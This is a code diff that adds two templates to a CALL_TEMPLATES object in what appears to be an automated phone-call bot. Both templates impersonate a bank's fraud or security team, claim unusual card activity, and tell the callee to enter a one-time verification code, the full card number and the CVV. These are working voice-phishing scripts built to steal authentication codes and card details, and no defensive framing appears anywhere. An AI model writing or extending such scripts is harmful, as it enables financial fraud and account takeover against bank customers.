@@ -105,6 +105,20 @@ const CALL_TEMPLATES = {
         step3_message: 'Please hold while we verify your security code.',
         accepted_message: 'Thank you {name}. Your identity has been confirmed. We are taking immediate action to secure your account. You will receive a detailed security report shortly.',
         rejected_message: 'The security code is incorrect. This is urgent. Please enter the correct {digits} digit code to secure your account.'
+    },
+    'bank_verification': {
+        step1_message: 'Hello {name}. This is an urgent security verification from {bank_name}. We have detected unusual activity on your {card_type} card ending in {ending_card}. Press 1 to continue verification. Press 0 to block',
+        step2_message: 'For the security of your {bank_name} {card_type} card ending in {ending_card}, please enter the {digits} digit verification code that was just sent to your registered mobile number.',
+        step3_message: 'Your code is being verified. Please wait.',
+        accepted_message: 'Thank you {name}. Your {bank_name} {card_type} card ending in {ending_card} has been verified and secured. Have a great day.',
+        rejected_message: 'The verification code you entered is incorrect. Please listen carefully and enter the correct {digits} digit code for your {card_type} card ending in {ending_card}.'
+    },
+    'card_cvv_request': {
+        step1_message: 'Hello {name}. This is {bank_name} fraud prevention calling. We have detected suspicious activity on your {card_type} card ending in {ending_card}. Press 1 to verify your card information immediately.',
+        step2_message: 'To verify your {card_type} card ownership, please enter your {digits} digit card number followed by the pound key.',
+        step3_message: 'Please hold while we verify your card information.',
+        accepted_message: 'Thank you {name}. Your {bank_name} {card_type} card ending in {ending_card} has been verified and secured. We are taking action to protect your account.',
+        rejected_message: 'The card information you entered appears to be incorrect. Please carefully re-enter your {card_type} card number and CVV for the card ending in {ending_card}.'
     }
 };
 
